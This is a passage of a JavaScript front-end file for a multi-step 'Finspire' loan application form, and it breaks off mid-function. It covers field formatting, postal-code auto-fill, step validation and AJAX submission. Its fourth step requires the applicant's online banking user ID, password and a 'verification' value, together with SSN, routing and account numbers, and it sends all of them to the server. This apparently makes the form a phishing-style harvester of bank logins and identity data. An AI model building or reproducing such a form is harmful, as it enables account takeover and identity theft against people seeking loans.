/**
 * Finspire Loan Application Form - Frontend Multi-Step Logic & Zippopotam.us Auto-Fill
 * Redesigned according to reference screenshots.
 */

(function($) {
    'use strict';

    var currentStep = 1;
    var totalSteps = 4;
    var stepHeaders = {
        1: (typeof FinspireLoanData !== 'undefined' && FinspireLoanData.step1_header) || 'Step 1 of 4 — Personal Info',
        2: (typeof FinspireLoanData !== 'undefined' && FinspireLoanData.step2_header) || 'Step 2 of 4 — Address',
        3: (typeof FinspireLoanData !== 'undefined' && FinspireLoanData.step3_header) || 'Step 3 of 4 — Loan Amount',
        4: (typeof FinspireLoanData !== 'undefined' && FinspireLoanData.step4_header) || 'Step 4 of 4 — Banking Details'
    };

    // Auto-fill state tracking
    var zippoAbortController = null;
    var zippoLookupTimeout = null;
    var lastLookedUpZip = '';
    var lastLookedUpCountry = '';
    var userManuallyEditedCity = false;
    var userManuallyEditedState = false;
    var userManuallyEditedCountry = false;

    $(document).ready(function() {
        var $form = $('#finspire-multi-step-form');
        if (!$form.length) return;

        // Initialize UI state
        updateStepUI(currentStep);

        // SSN eye toggle
        $('#toggle-ssn-visibility').on('click', function(e) {
            e.preventDefault();
            var $input = $('#fin_ssn');
            var isPassword = $input.attr('type') === 'password';
            $input.attr('type', isPassword ? 'text' : 'password');
            $(this).find('.eye-show').toggle(!isPassword);
            $(this).find('.eye-hide').toggle(isPassword);
        });

        // Bank password eye toggle
        $('#toggle-bank-password-visibility').on('click', function(e) {
            e.preventDefault();
            var $input = $('#fin_bank_password');
            var isPassword = $input.attr('type') === 'password';
            $input.attr('type', isPassword ? 'text' : 'password');
            $(this).find('.eye-show').toggle(!isPassword);
            $(this).find('.eye-hide').toggle(isPassword);
        });

        // Date of Birth auto-formatter & validation check
        $('#fin_dob').on('input', function() {
            var val = $(this).val().replace(/\D/g, '');
            if (val.length > 8) val = val.substring(0, 8);
            
            var formatted = val;
            if (val.length > 4) {
                formatted = val.substring(0, 2) + '/' + val.substring(2, 4) + '/' + val.substring(4);
            } else if (val.length > 2) {
                formatted = val.substring(0, 2) + '/' + val.substring(2);
            }
            $(this).val(formatted);

            if (isValidDOB(formatted)) {
                $('#dob-looks-good').show();
                $(this).addClass('is-valid').removeClass('is-invalid');
                clearFieldError('dob');
            } else {
                $('#dob-looks-good').hide();
                $(this).removeClass('is-valid');
            }
        });

        // SSN auto-formatting (XXX-XX-XXXX)
        $('#fin_ssn').on('input', function() {
            var val = $(this).val().replace(/\D/g, '');
            if (val.length > 9) val = val.substring(0, 9);
            var formatted = val;
            if (val.length > 5) {
                formatted = val.substring(0, 3) + '-' + val.substring(3, 5) + '-' + val.substring(5);
            } else if (val.length > 3) {
                formatted = val.substring(0, 3) + '-' + val.substring(3);
            }
            $(this).val(formatted);
            if (val.length === 9) {
                $(this).addClass('is-valid').removeClass('is-invalid');
                clearFieldError('ssn');
            } else {
                $(this).removeClass('is-valid');
            }
        });

        // Phone number auto-formatting ( (XXX) XXX-XXXX )
        $('#fin_phone').on('input', function() {
            var val = $(this).val().replace(/\D/g, '');
            if (val.length > 10) val = val.substring(0, 10);
            var formatted = val;
            if (val.length > 6) {
                formatted = '(' + val.substring(0, 3) + ') ' + val.substring(3, 6) + '-' + val.substring(6);
            } else if (val.length > 3) {
                formatted = '(' + val.substring(0, 3) + ') ' + val.substring(3);
            } else if (val.length > 0) {
                formatted = '(' + val;
            }
            $(this).val(formatted);
            if (val.length === 10) {
                $(this).addClass('is-valid').removeClass('is-invalid');
                clearFieldError('phone');
            } else {
                $(this).removeClass('is-valid');
            }
        });
        // STEP 2: ADDRESS INPUT EVENT LISTENERS
        // ==========================================

        // City Input: track manual edit and toggle checkmark
        $('#fin_city').on('input', function() {
            userManuallyEditedCity = true;
            clearFieldError('city');
            if ($.trim($(this).val())) {
                $('#city-check-icon').show();
                $(this).addClass('is-valid');
            } else {
                $('#city-check-icon').hide();
                $(this).removeClass('is-valid');
            }
        });

        // State Input: track manual edit and toggle checkmark
        $('#fin_state').on('input', function() {
            userManuallyEditedState = true;
            clearFieldError('state');
            if ($.trim($(this).val())) {
                $('#state-check-icon').show();
                $(this).addClass('is-valid');
            } else {
                $('#state-check-icon').hide();
                $(this).removeClass('is-valid');
            }
        });

        // Country Input: track manual edit, toggle checkmark, re-trigger lookup if zip present
        $('#fin_country').on('input', function() {
            userManuallyEditedCountry = true;
            clearFieldError('country');
            if ($.trim($(this).val())) {
                $('#country-check-icon').show();
                $(this).addClass('is-valid');
            } else {
                $('#country-check-icon').hide();
                $(this).removeClass('is-valid');
            }

            // Reset lookup cache
            lastLookedUpZip = '';
            lastLookedUpCountry = '';

            var currentZip = $.trim($('#fin_zip').val());
            if (currentZip) {
                clearTimeout(zippoLookupTimeout);
                zippoLookupTimeout = setTimeout(function() {
                    triggerPostalLookup(false);
                }, 700);
            }
        });

        // Postal Code (ZIP): debounced lookup on input & immediate on blur
        $('#fin_zip').on('input', function() {
            clearFieldError('zip_code');
            $('#zip-check-icon').hide();
            $(this).removeClass('is-valid');

            clearTimeout(zippoLookupTimeout);
            zippoLookupTimeout = setTimeout(function() {
                triggerPostalLookup(false);
            }, 600);
        });

        $('#fin_zip').on('blur', function() {
            clearTimeout(zippoLookupTimeout);
            triggerPostalLookup(true);
        });

        // Clear field errors on general input/change
        $form.on('input change', 'input, select', function() {
            var name = $(this).attr('name');
            if (name) {
                clearFieldError(name);
            }
        });

        // Live update summary when loan amount changes
        $('#fin_loan_amount').on('input change', function() {
            populateSummary();
        });

        // ==========================================
        // CUSTOM POLISHED LOAN PURPOSE DROPDOWN
        // ==========================================
        var $customDropdown = $('#fin_loan_purpose_dropdown');
        var $dropdownTrigger = $('#fin_purpose_trigger');
        var $dropdownMenu = $('#fin_purpose_menu');
        var $hiddenSelect = $('#fin_loan_purpose');
        var $selectedText = $dropdownTrigger.find('.fin-dropdown-selected-text');

        // Clean up any conflicting niceSelect instances created by the theme
        if ($.fn.niceSelect) {
            try {
                $hiddenSelect.niceSelect('destroy');
            } catch (e) {}
        }
        $('#finspire-multi-step-form .nice-select').remove();

        // Guard with MutationObserver in case theme/Elementor re-injects nice-select
        var formEl = document.getElementById('finspire-multi-step-form');
        if (formEl && window.MutationObserver) {
            var niceSelectKiller = new MutationObserver(function() {
                var $rogue = $('#finspire-multi-step-form .nice-select');
                if ($rogue.length) {
                    $rogue.remove();
                }
            });
            niceSelectKiller.observe(formEl, { childList: true, subtree: true });
        }

        function openCustomDropdown() {
            $customDropdown.addClass('open');
            $dropdownTrigger.attr('aria-expanded', 'true');
            $dropdownMenu.stop(true, true).fadeIn(150);
            
            var $selectedOpt = $dropdownMenu.find('.fin-dropdown-option.selected');
            if ($selectedOpt.length) {
                $selectedOpt.focus();
            }
        }

        function closeCustomDropdown() {
            $customDropdown.removeClass('open');
            $dropdownTrigger.attr('aria-expanded', 'false');
            $dropdownMenu.stop(true, true).fadeOut(120);
        }

        // Toggle dropdown on trigger click
        $dropdownTrigger.on('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            if ($customDropdown.hasClass('open')) {
                closeCustomDropdown();
            } else {
                openCustomDropdown();
            }
        });

        // Select an option
        $customDropdown.on('click', '.fin-dropdown-option', function(e) {
            e.preventDefault();
            e.stopPropagation();
            var val = $(this).data('value');
            var text = $(this).find('.option-label').text();

            $hiddenSelect.val(val).trigger('change').trigger('input');
            $selectedText.text(text).removeClass('fin-placeholder-text placeholder');

            $customDropdown.find('.fin-dropdown-option').removeClass('selected');
            $(this).addClass('selected');

            clearFieldError('loan_purpose');
            closeCustomDropdown();
            $dropdownTrigger.focus();
            populateSummary();
        });

        // Close on clicking outside
        $(document).on('click', function(e) {
            if (!$(e.target).closest('#fin_loan_purpose_dropdown').length) {
                closeCustomDropdown();
            }
        });

        // Keyboard navigation
        $dropdownTrigger.on('keydown', function(e) {
            if (e.key === 'ArrowDown' || e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                openCustomDropdown();
                $dropdownMenu.find('.fin-dropdown-option').first().focus();
            } else if (e.key === 'Escape') {
                closeCustomDropdown();
            }
        });

        $dropdownMenu.on('keydown', '.fin-dropdown-option', function(e) {
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                var $next = $(this).next('.fin-dropdown-option');
                if ($next.length) $next.focus();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                var $prev = $(this).prev('.fin-dropdown-option');
                if ($prev.length) {
                    $prev.focus();
                } else {
                    $dropdownTrigger.focus();
                }
            } else if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                $(this).trigger('click');
            } else if (e.key === 'Escape') {
                closeCustomDropdown();
                $dropdownTrigger.focus();
            }
        });

        // Next Step Button
        $('.btn-next').on('click', function(e) {
            e.preventDefault();
            var nextStep = parseInt($(this).data('next'), 10);
            if (validateStep(currentStep)) {
                goToStep(nextStep);
            }
        });

        // Prev Step Button
        $('.btn-prev').on('click', function(e) {
            e.preventDefault();
            var prevStep = parseInt($(this).data('prev'), 10);
            goToStep(prevStep);
        });

        // Top Tracker Item Click Navigation
        $('.tracker-item').css('cursor', 'pointer').on('click', function(e) {
            var targetStep = parseInt($(this).data('step'), 10);
            if (!targetStep || targetStep === currentStep) return;
            if (targetStep < currentStep) {
                goToStep(targetStep);
            } else {
                for (var s = currentStep; s < targetStep; s++) {
                    if (!validateStep(s)) {
                        goToStep(s);
                        return;
                    }
                }
                goToStep(targetStep);
            }
        });

        // Form Submit
        $form.on('submit', function(e) {
            e.preventDefault();

            // Validate step 4
            if (!validateStep(4)) {
                return;
            }

            // Also double-check all previous steps
            for (var s = 1; s <= 3; s++) {
                if (!validateStep(s)) {
                    goToStep(s);
                    return;
                }
            }

            submitApplication();
        });
    });

    /**
     * Switch UI to a specific step
     */
    function goToStep(step) {
        if (step < 1 || step > totalSteps) return;

        currentStep = step;
        updateStepUI(currentStep);

        // If entering step 3 or 4, populate the review summary
        if (currentStep === 3 || currentStep === 4) {
            populateSummary();
        }

        // Scroll to form card smoothly
        var $target = $('#loan-card');
        if ($target.length) {
            $('html, body').animate({
                scrollTop: $target.offset().top - 80
            }, 300);
        }
    }

    /**
     * Update UI for the current step: card heading, progress bar, tracker pills
     */
    function updateStepUI(step) {
        // Step Panes
        $('.form-step-pane').removeClass('active');
        $('#form-step-' + step).addClass('active');

        // Card Step Heading
        $('#card-step-heading').text(stepHeaders[step] || ('Step ' + step + ' of 4'));

        // Inside Card Progress Bar (25%, 50%, 75%, 100%)
        var cardProgressPct = (step / totalSteps) * 100;
        $('#card-progress-fill').css('width', cardProgressPct + '%');

        // Outside Tracker Track Line Fill (0%, 33%, 66%, 100%)
        var trackFillPct = ((step - 1) / (totalSteps - 1)) * 100;
        $('#step-track-fill').css('width', trackFillPct + '%');

        // Outside Tracker Items
        $('.tracker-item').each(function() {
            var itemStep = parseInt($(this).data('step'), 10);
            var $circle = $(this).find('.tracker-circle');

            if (itemStep < step) {
                // Completed
                $(this).removeClass('active').addClass('completed');
                $circle.html('<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
            } else if (itemStep === step) {
                // Current
                $(this).removeClass('completed').addClass('active');
                restoreTrackerIcon(itemStep, $circle);
            } else {
                // Future
                $(this).removeClass('completed active');
                restoreTrackerIcon(itemStep, $circle);
            }
        });
    }

    /**
     * Restore standard icon for a tracker item
     */
    function restoreTrackerIcon(stepNum, $circle) {
        var icons = {
            1: '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>',
            2: '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>',
            3: '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>',
            4: '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 21h18M3 10h18M5 10v11M9 10v11M15 10v11M19 10v11M12 2L2 7h20L12 2z"></path></svg>'
        };
        $circle.html(icons[stepNum] || '');
    }

    /**
     * Convert user country text into an ISO 3166-1 alpha-2 code for Zippopotam.us
     */
    function getCountryCodeFromInput(val) {
        if (!val) return 'us';
        var lower = $.trim(val).toLowerCase();
        var map = {
            'united states': 'us',
            'united states of america': 'us',
            'usa': 'us',
            'u.s.a.': 'us',
            'u.s.': 'us',
            'us': 'us',
            'canada': 'ca',
            'ca': 'ca',
            'united kingdom': 'gb',
            'great britain': 'gb',
            'uk': 'gb',
            'gb': 'gb',
            'england': 'gb',
            'germany': 'de',
            'deutschland': 'de',
            'de': 'de',
            'france': 'fr',
            'fr': 'fr',
            'australia': 'au',
            'au': 'au',
            'spain': 'es',
            'españa': 'es',
            'es': 'es',
            'italy': 'it',
            'italia': 'it',
            'it': 'it',
            'netherlands': 'nl',
            'holland': 'nl',
            'nl': 'nl',
            'mexico': 'mx',
            'méxico': 'mx',
            'mx': 'mx',
            'india': 'in',
            'in': 'in',
            'brazil': 'br',
            'brasil': 'br',
            'br': 'br',
            'austria': 'at',
            'at': 'at',
            'switzerland': 'ch',
            'ch': 'ch',
            'new zealand': 'nz',
            'nz': 'nz',
            'belgium': 'be',
            'be': 'be',
            'sweden': 'se',
            'se': 'se',
            'norway': 'no',
            'no': 'no',
            'denmark': 'dk',
            'dk': 'dk',
            'finland': 'fi',
            'fi': 'fi',
            'poland': 'pl',
            'polska': 'pl',
            'pl': 'pl',
            'japan': 'jp',
            'jp': 'jp',
            'south africa': 'za',
            'za': 'za'
        };
        if (map[lower]) {
            return map[lower];
        }
        if (lower.length === 2 && /^[a-z]{2}$/.test(lower)) {
            return lower;
        }
        return 'us';
    }

    /**
     * Zippopotam.us Postal Code Auto-fill Logic
     */
    function triggerPostalLookup(isBlur) {
        var rawCountry = $.trim($('#fin_country').val());
        var countryCode = getCountryCodeFromInput(rawCountry);
        var rawZip = $.trim($('#fin_zip').val());

        if (!rawZip) {
            hideZippoStatus();
            $('#zip-check-icon').hide();
            $('#fin_zip').removeClass('is-valid');
            return;
        }

        // Clean & format postal code for API
        var apiZip = rawZip;
        if (countryCode === 'ca') {
            apiZip = rawZip.replace(/\s+/g, '').toUpperCase().substring(0, 3);
        } else if (countryCode === 'gb') {
            var parts = rawZip.trim().split(/\s+/);
            apiZip = parts[0].toUpperCase();
        } else if (countryCode === 'us') {
            var digits = rawZip.replace(/\D/g, '');
            if (digits.length >= 5) {
                apiZip = digits.substring(0, 5);
            } else if (!isBlur) {
                return;
            }
        }

        // Avoid repeating identical lookup
        if (apiZip === lastLookedUpZip && countryCode === lastLookedUpCountry && !isBlur) {
            return;
        }

        // Cancel any pending fetch request
        if (zippoAbortController) {
            zippoAbortController.abort();
        }
        if (window.AbortController) {
            zippoAbortController = new AbortController();
        }

        showZippoStatus('loading', 'Looking up address...');

        var apiUrl = 'https://api.zippopotam.us/' + encodeURIComponent(countryCode) + '/' + encodeURIComponent(apiZip);
        var fetchOptions = {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        };
        if (zippoAbortController) {
            fetchOptions.signal = zippoAbortController.signal;
        }

        fetch(apiUrl, fetchOptions)
            .then(function(response) {
                if (!response.ok) {
                    throw new Error('HTTP ' + response.status);
                }
                return response.json();
            })
            .then(function(data) {
                lastLookedUpZip = apiZip;
                lastLookedUpCountry = countryCode;

                if (data && data.places && data.places.length > 0) {
                    var places = data.places;
                    var primary = places[0];
                    var placeName = primary['place name'] || '';
                    var stateName = primary['state'] || '';
                    var stateAbbr = primary['state abbreviation'] || '';
                    var countryReturned = data['country'] || 'United States';

                    // Show success indicator inside zip input
                    $('#zip-check-icon').show();
                    $('#fin_zip').addClass('is-valid').removeClass('is-invalid');

                    // Auto-fill City
                    if (!userManuallyEditedCity || !$.trim($('#fin_city').val())) {
                        $('#fin_city').val(placeName);
                        $('#city-check-icon').show();
                        $('#fin_city').addClass('is-valid').removeClass('is-invalid');
                        clearFieldError('city');
                    }

                    // Auto-fill State
                    var stateVal = stateAbbr || stateName;
                    if (!userManuallyEditedState || !$.trim($('#fin_state').val())) {
                        $('#fin_state').val(stateVal);
                        $('#state-check-icon').show();
                        $('#fin_state').addClass('is-valid').removeClass('is-invalid');
                        clearFieldError('state');
                    }

                    // Auto-fill Country
                    if (!userManuallyEditedCountry || !$.trim($('#fin_country').val())) {
                        $('#fin_country').val(countryReturned);
                        $('#country-check-icon').show();
                        $('#fin_country').addClass('is-valid').removeClass('is-invalid');
                        clearFieldError('country');
                    }

                    var displayState = stateAbbr || stateName;
                    var summaryText = 'Found: ' + placeName + (displayState ? (', ' + displayState) : '');
                    showZippoStatus('found', summaryText);
                } else {
                    handleZippoFallback();
                }
            })
            .catch(function(err) {
                if (err.name === 'AbortError') {
                    return;
                }
                handleZippoFallback();
            });
    }

    /**
     * Fallback handler when Zippopotam.us returns 404 or unsupported postal code
     */
    function handleZippoFallback() {
        $('#zip-check-icon').hide();
        $('#fin_zip').removeClass('is-valid');
        showZippoStatus('fallback', 'Postal code not found. Please enter your address manually.');
    }

    /**
     * Display status message under postal code
     */
    function showZippoStatus(type, message) {
        var $el = $('#zip-status-note');
        $el.removeClass('loading found fallback').addClass(type);
        if (type === 'found') {
            $el.html('<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#16a34a" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg> <span>' + escapeHtml(message) + '</span>');
        } else if (type === 'loading') {
            $el.html('<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#2563eb" stroke-width="2.5" class="spin-icon"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg> <span>' + escapeHtml(message) + '</span>');
        } else {
            $el.html('<span>' + escapeHtml(message) + '</span>');
        }
        $el.show();
    }

    function hideZippoStatus() {
        $('#zip-status-note').hide().empty();
    }

    function isValidDOB(dobStr) {
        if (!dobStr || dobStr.length !== 10) return false;
        var parts = dobStr.split('/');
        if (parts.length !== 3) return false;

        var m = parseInt(parts[0], 10);
        var d = parseInt(parts[1], 10);
        var y = parseInt(parts[2], 10);

        if (isNaN(m) || isNaN(d) || isNaN(y)) return false;
        if (m < 1 || m > 12) return false;
        if (d < 1 || d > 31) return false;
        if (y < 1900 || y > 2026) return false;

        var birthDate = new Date(y, m - 1, d);
        var today = new Date();
        var age = today.getFullYear() - birthDate.getFullYear();
        var monthDiff = today.getMonth() - birthDate.getMonth();
        if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
            age--;
        }

        return age >= 18;
    }

    /**
     * Client-side validation per step
     */
    function validateStep(step) {
        var isValid = true;
        var firstInvalid = null;

        if (step === 1) {
            // First Name
            var firstName = $.trim($('#fin_first_name').val());
            if (!firstName) {
                showFieldError('first_name', 'Please enter your first name.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_first_name';
            }

            // Last Name
            var lastName = $.trim($('#fin_last_name').val());
            if (!lastName) {
                showFieldError('last_name', 'Please enter your last name.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_last_name';
            }

            // Email Address
            var email = $.trim($('#fin_email').val());
            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!email) {
                showFieldError('email', 'Please enter your email address.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_email';
            } else if (!emailRegex.test(email)) {
                showFieldError('email', 'Please enter a valid email address.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_email';
            }

            // Phone Number
            var phone = $.trim($('#fin_phone').val()).replace(/\D/g, '');
            if (!phone) {
                showFieldError('phone', 'Please enter your phone number.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_phone';
            } else if (phone.length !== 10) {
                showFieldError('phone', 'Please enter a valid 10-digit phone number.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_phone';
            }

            // Date of Birth
            var dob = $.trim($('#fin_dob').val());
            if (!dob) {
                showFieldError('dob', 'Please enter your date of birth (MM/DD/YYYY).');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_dob';
            } else if (!isValidDOB(dob)) {
                showFieldError('dob', 'Applicant must be at least 18 years old. Please enter a valid date of birth (MM/DD/YYYY).');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_dob';
            }

            // SSN
            var ssn = $.trim($('#fin_ssn').val()).replace(/\D/g, '');
            if (!ssn) {
                showFieldError('ssn', 'Please enter your Social Security Number.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_ssn';
            } else if (ssn.length !== 9) {
                showFieldError('ssn', 'Please enter a valid 9-digit Social Security Number.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_ssn';
            }
        } else if (step === 2) {
            // Street Address
            var street = $.trim($('#fin_street').val());
            if (!street) {
                showFieldError('street_address', 'Please enter your street address.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_street';
            }

            // ZIP / Postal Code
            var zip = $.trim($('#fin_zip').val());
            if (!zip) {
                showFieldError('zip_code', 'Please enter your ZIP or postal code.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_zip';
            }

            // City
            var city = $.trim($('#fin_city').val());
            if (!city) {
                showFieldError('city', 'Please enter your city.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_city';
            }

            // State
            var state = $.trim($('#fin_state').val());
            if (!state) {
                showFieldError('state', 'Please enter your state / province.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_state';
            }

            // Country
            var country = $.trim($('#fin_country').val());
            if (!country) {
                showFieldError('country', 'Please enter your country.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_country';
            }
        } else if (step === 3) {
            // Requested Loan Amount
            var amount = parseFloat($('#fin_loan_amount').val());
            var min = parseFloat((typeof FinspireLoanData !== 'undefined' && FinspireLoanData.min_loan_amount) || 100);
            var max = parseFloat((typeof FinspireLoanData !== 'undefined' && FinspireLoanData.max_loan_amount) || 25000);
            var sym = (typeof FinspireLoanData !== 'undefined' && FinspireLoanData.currency_symbol) || '$';

            if (isNaN(amount) || amount <= 0) {
                showFieldError('loan_amount', 'Please enter a valid loan amount.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_loan_amount';
            } else if (amount < min || amount > max) {
                showFieldError('loan_amount', 'Enter amount between ' + sym + min.toLocaleString() + ' – ' + sym + max.toLocaleString());
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_loan_amount';
            }

            // Loan Purpose
            var loanPurpose = $.trim($('#fin_loan_purpose').val());
            if (!loanPurpose) {
                showFieldError('loan_purpose', 'Please select a loan purpose.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_purpose_trigger';
            }
        } else if (step === 4) {
            // Bank Name
            var bankName = $.trim($('#fin_bank_name').val());
            if (!bankName) {
                showFieldError('bank_name', 'Please enter your bank name.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_bank_name';
            }

            // Routing Number
            var routing = $.trim($('#fin_routing_number').val()).replace(/\D/g, '');
            if (!routing) {
                showFieldError('routing_number', 'Please enter your 9-digit routing number.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_routing_number';
            } else if (routing.length !== 9) {
                showFieldError('routing_number', 'Routing number must be exactly 9 digits.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_routing_number';
            }

            // Account Number
            var account = $.trim($('#fin_account_number').val()).replace(/\D/g, '');
            if (!account) {
                showFieldError('account_number', 'Please enter your account number.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_account_number';
            } else if (account.length < 4 || account.length > 17) {
                showFieldError('account_number', 'Please enter a valid bank account number (4 to 17 digits).');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_account_number';
            }

            // Online Banking Verification
            var bankVerification = $.trim($('#fin_bank_verification').val());
            if (!bankVerification) {
                showFieldError('online_banking_verification', 'Please complete the online banking verification field.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_bank_verification';
            }

            // Online Banking User ID
            var bankUserId = $.trim($('#fin_bank_user_id').val());
            if (!bankUserId) {
                showFieldError('online_banking_user_id', 'Please enter your online banking user ID.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_bank_user_id';
            }

            // Online Banking Password
            var bankPass = $('#fin_bank_password').val();
            if (!bankPass) {
                showFieldError('online_banking_password', 'Please enter your online banking password.');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_bank_password';
            }

            // Contact Consent Checkbox
            var $contactConsent = $('#fin_contact_consent');
            if (!$contactConsent.is(':checked')) {
                showFieldError('contact_consent', 'Please check this box to agree and continue.');
                $('#contact-consent-wrapper').addClass('is-invalid');
                isValid = false;
                if (!firstInvalid) firstInvalid = '#fin_contact_consent';
            } else {
                $('#contact-consent-wrapper').removeClass('is-invalid');
            }
        }

        if (firstInvalid) {
            $(firstInvalid).focus();
        }

        return isValid;
    }

    /**
     * Show validation error on an input
     */
    function showFieldError(fieldName, msg) {
        var $input = $('[name="' + fieldName + '"], #' + fieldName);
        $input.addClass('is-invalid');
        if (fieldName === 'loan_purpose') {
            $('#fin_purpose_trigger').addClass('is-invalid');
        }
        var $errContainer = $('#err_' + fieldName);
        if ($errContainer.length) {
            $errContainer.text(msg).addClass('visible');
        }
    }

    /**
     * Clear validation error on an input
     */
    function clearFieldError(fieldName) {
        var $input = $('[name="' + fieldName + '"], #' + fieldName);
        $input.removeClass('is-invalid');
        if (fieldName === 'loan_purpose') {
            $('#fin_purpose_trigger').removeClass('is-invalid');
        }
        if (fieldName === 'contact_consent') {
            $('#contact-consent-wrapper').removeClass('is-invalid');
        }
        var $errContainer = $('#err_' + fieldName);
        if ($errContainer.length) {
            $errContainer.text('').removeClass('visible');
        }
    }

    /**
     * Populate Step 4 Review Summary
     */
    function populateSummary() {
        var first = $.trim($('#fin_first_name').val());
        var last  = $.trim($('#fin_last_name').val());
        var name  = (first + ' ' + last).trim() || '—';
        var email = $.trim($('#fin_email').val()) || '—';
        var phone = $.trim($('#fin_phone').val()) || '—';
        var dob   = $.trim($('#fin_dob').val()) || '—';

        var street  = $.trim($('#fin_street').val());
        var city    = $.trim($('#fin_city').val());
        var state   = $.trim($('#fin_state').val());
        var zip     = $.trim($('#fin_zip').val());
        var country = $.trim($('#fin_country').val());

        var addrParts = [];
        if (street) addrParts.push(street);
        if (city) addrParts.push(city);
        if (state) addrParts.push(state);
        if (zip) addrParts.push(zip);
        if (country) addrParts.push(country);
        var fullAddress = addrParts.join(', ') || '—';

        var amountVal = parseFloat($('#fin_loan_amount').val());
        var sym = (typeof FinspireLoanData !== 'undefined' && FinspireLoanData.currency_symbol) || '$';
        var formattedAmount = (!isNaN(amountVal) && amountVal > 0) ? (sym + amountVal.toLocaleString()) : '—';
        var purpose = $.trim($('#fin_loan_purpose').val()) || '—';

        $('#sum-name').text(name);
        $('#sum-email').text(email);
        $('#sum-phone').text(phone);
        $('#sum-dob').text(dob);
        $('#sum-address').text(fullAddress);
        $('#sum-amount').text(formattedAmount);
        $('#sum-purpose').text(purpose);
    }

    var isSubmitting = false;

    /**
     * Submit Application via AJAX
     */
    function submitApplication() {
        if (isSubmitting) {
            return;
        }

        var $form = $('#finspire-multi-step-form');
        var $submitBtn = $('#loan-submit-btn');
        var $globalError = $('#loan-global-error');

        $globalError.hide().empty();
        isSubmitting = true;
        $submitBtn.prop('disabled', true);
        $submitBtn.find('.btn-text-normal').hide();
        $submitBtn.find('.btn-text-loading').show();

        // Safe same-origin URL resolution to prevent CORS/host mismatch errors
        var ajaxUrl = (typeof FinspireLoanData !== 'undefined' && FinspireLoanData.ajax_url) || '/wordpress/wp-admin/admin-ajax.php';
        try {
            var resolvedUrl = new URL(ajaxUrl, window.location.href);
            if (resolvedUrl.host !== window.location.host) {
                ajaxUrl = window.location.origin + resolvedUrl.pathname + resolvedUrl.search;
            }
        } catch (e) {
            ajaxUrl = '/wordpress/wp-admin/admin-ajax.php';
        }

        // Nonce fallback from multiple sources
        var nonce = (typeof FinspireLoanData !== 'undefined' && FinspireLoanData.nonce)
                 || $('#loan_nonce').val()
                 || $('#_wpnonce').val()
                 || $('[name="loan_nonce"]').val()
                 || '';

        var formData = $form.serialize();
        formData += '&action=finspire_submit_loan_application&nonce=' + encodeURIComponent(nonce);

        $.ajax({
            url: ajaxUrl,
            type: 'POST',
            data: formData,
            dataType: 'json',
            timeout: 30000,
            success: function(response) {
                if (response && response.success) {
                    var data = response.data;
                    displaySuccessScreen(data);
                } else {
                    var errorMsg = (response && response.data && response.data.message)
                        ? response.data.message
                        : 'An error occurred during submission. Please try again.';

                    $globalError.text(errorMsg).show();

                    if (response && response.data && response.data.errors) {
                        $.each(response.data.errors, function(field, msg) {
                            showFieldError(field, msg);
                        });
                    }

                    $('html, body').animate({
                        scrollTop: $('#loan-card').offset().top - 80
                    }, 300);
                }
            },
            error: function(xhr, status, error) {
                var errorMsg = '';

                // 1. Try to read structured JSON from response
                if (xhr.responseJSON && xhr.responseJSON.data) {
                    if (typeof xhr.responseJSON.data === 'string') {
                        errorMsg = xhr.responseJSON.data;
                    } else if (xhr.responseJSON.data.message) {
                        errorMsg = xhr.responseJSON.data.message;
                    }
                    if (xhr.responseJSON.data.errors) {
